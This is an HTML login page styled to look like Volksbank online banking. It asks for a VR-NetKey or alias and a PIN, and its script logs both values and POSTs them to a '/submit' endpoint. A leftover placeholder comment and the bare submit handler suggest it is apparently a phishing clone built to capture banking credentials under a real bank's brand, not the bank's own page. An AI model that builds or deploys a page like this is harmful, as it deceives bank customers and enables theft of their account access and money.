<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
<title>Online Banking – Login</title>

<style>
:root {
  --primary: #005ca9;
  --primary-dark: #004a87;
  --border: #d9d9d9;
  --bg: #f4f6f8;
  --text: #1a1a1a;
  --muted: #6b7280;
}

* {
  box-sizing: border-box;
  font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
}

body {
  margin: 0;
  background: var(--bg);
  color: var(--text);
}

/* Header */
header {
  background: white;
  border-bottom: 1px solid var(--border);
  padding: 16px 32px;
  display: flex;
  align-items: center;
}

.logo {
  display: flex;
  align-items: center;
  gap: 12px;
  font-weight: 600;
  font-size: 18px;
  color: var(--primary);
}

/* Main layout */
main {
  display: flex;
  justify-content: center;
  padding: 48px 16px;
}

.card {
  background: white;
  width: 100%;
  max-width: 520px;
  border-radius: 12px;
  box-shadow: 0 4px 20px rgba(0,0,0,0.06);
  padding: 32px;
}

/* Headings */
.card h1 {
  margin-top: 0;
  margin-bottom: 8px;
}

.card p {
  margin-top: 0;
  color: var(--muted);
}

/* Tabs */
.tabs {
  display: flex;
  border-bottom: 1px solid var(--border);
  margin: 24px 0;
}

.tab {
  padding: 12px 16px;
  cursor: pointer;
  font-weight: 500;
  color: var(--muted);
}

.tab.active {
  color: var(--primary);
  border-bottom: 3px solid var(--primary);
}

/* Form */
.form-group {
  margin-bottom: 16px;
}

label {
  display: block;
  font-size: 14px;
  margin-bottom: 6px;
}

input {
  width: 100%;
  padding: 12px 14px;
  border-radius: 8px;
  border: 1px solid var(--border);
  font-size: 16px;
}

input:focus {
  outline: none;
  border-color: var(--primary);
}

.pin-wrapper {
  position: relative;
}

.pin-wrapper span {
  position: absolute;
  right: 14px;
  top: 50%;
  transform: translateY(-50%);
  color: var(--muted);
  cursor: pointer;
}

/* Links */
a {
  color: var(--primary);
  text-decoration: none;
  font-size: 14px;
}

a:hover {
  text-decoration: underline;
}

.forgot {
  text-align: right;
  margin-top: 6px;
}

/* Buttons */
.actions {
  display: flex;
  justify-content: space-between;
  margin-top: 32px;
}

.btn {
  padding: 12px 28px;
  border-radius: 999px;
  font-size: 15px;
  cursor: pointer;
}

.btn.secondary {
  background: white;
  border: 1px solid var(--primary);
  color: var(--primary);
}

.btn.primary {
  background: var(--primary);
  border: none;
  color: white;
}

.btn.primary:hover {
  background: var(--primary-dark);
}

/* Info section */
.info {
  margin-top: 24px;
  font-size: 14px;
  color: var(--muted);
}

.info p {
  margin-bottom: 8px;
}
</style>
</head>

<body>

<header>
  <div class="logo">
    <!-- Replace with your SVG/logo -->
    <div style="width:32px;height:32px;background:#005ca9;border-radius:4px;"></div>
    Volksbank
  </div>
</header>

<main>
  <div class="card">
    <h1>Log in</h1>
    <p>Welcome to Online Banking</p>

    <div class="tabs">
      <div class="tab active">Log in with access credentials</div>
      <div class="tab">Log in with QR code</div>
    </div>

    <form id="loginForm">
      <div class="form-group">
        <label>VR-NetKey or alias</label>
        <input type="text" name="userId" placeholder="Enter your VR-NetKey or alias">
      </div>

      <div class="form-group">
        <label>PIN</label>
        <div class="pin-wrapper">
          <input type="password" name="pin" placeholder="Enter PIN">
        </div>
        <div class="forgot">
          <a href="#">Forgot your PIN?</a>
        </div>
      </div>

      <div class="actions">
        <button type="button" class="btn secondary">Cancel</button>
        <button type="submit" class="btn primary">Log in</button>
      </div>
    </form>

    <div class="info">
      <p>• For your own security, please observe the safety instructions.</p>
      <p>• Don't have online banking access yet? <a href="#">Learn how to get access</a></p>
    </div>
  </div>
</main>

</body>

</html>

<script>
document.getElementById('loginForm').addEventListener('submit', async (e) => {
  e.preventDefault();

  const formData = new FormData(e.target);
  const data = {
    userId: formData.get('userId'),
    pin: formData.get('pin')
  };

  console.log(data)

  try {
    const response = await fetch('/submit', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify(data)
    });

    if (response.ok) {
      console.log('Login successful');
      // Handle success (redirect, show message, etc.)
    }
  } catch (error) {
    console.error('Error:', error);
  }
});
</script>
